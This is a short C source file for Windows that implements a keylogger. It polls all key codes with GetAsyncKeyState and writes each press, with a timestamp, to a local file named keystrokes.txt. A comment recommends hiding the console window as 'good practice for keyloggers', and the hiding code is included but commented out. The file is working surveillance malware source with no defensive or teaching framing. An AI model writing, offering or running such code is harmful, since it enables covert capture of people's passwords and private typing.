#include <stdio.h>
#include <windows.h>
#include <ctype.h>
#include <time.h>

#define LOG_FILE "keystrokes.txt"

// Function to get the current timestamp
void get_timestamp(char *timestamp) {
    time_t rawtime;
    struct tm *timeinfo;

    time(&rawtime);
    timeinfo = localtime(&rawtime);

    strftime(timestamp, 20, "%Y-%m-%d %H:%M:%S", timeinfo);
}


void log_keystroke(int key) {
    FILE *file = fopen(LOG_FILE, "a");
    if (file != NULL) {
        char timestamp[20];
        get_timestamp(timestamp);

        fprintf(file, "[%s] ", timestamp);

        // Handle special keys and printable characters
        if (key == VK_SPACE) {
            fprintf(file, " ");
        } else if (key == VK_RETURN) {
            fprintf(file, "\n");
        } else if (key == VK_TAB) {
            fprintf(file, "\t");
        } else if (key == VK_BACK) {
            fprintf(file, "[BACKSPACE]");
        } else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {
            fprintf(file, "[SHIFT]");
        } else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) {
            fprintf(file, "[CTRL]");
        } else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) {
            fprintf(file, "[ALT]");
        } else if (key >= 0x30 && key <= 0x5A) { // Alphanumeric characters
            fprintf(file, "%c", (char)key);
        } else {
            fprintf(file, "[KEY:%d]", key); // Log the key code if not handled
        }

        fprintf(file, "\n"); // Add a newline after each entry
        fclose(file);
    } else {
        perror("Error opening keystrokes.txt"); // Use perror for better error messages
    }
}

int main() {
    int key;
    // Hide the console window (optional, but good practice for keyloggers)
    // HWND hWnd = GetConsoleWindow();
    // ShowWindow(hWnd, SW_HIDE);

    while (1) {
        for (key = 1; key <= 255; key++) { // Iterate through all possible keys
            if (GetAsyncKeyState(key) & 0x8000) {
                log_keystroke(key);
                // Debounce the key press to avoid multiple logs for a single press
                Sleep(20); // Increased sleep time for better debouncing
            }
        }
        Sleep(1); // Reduce CPU usage
    }
    return 0;
}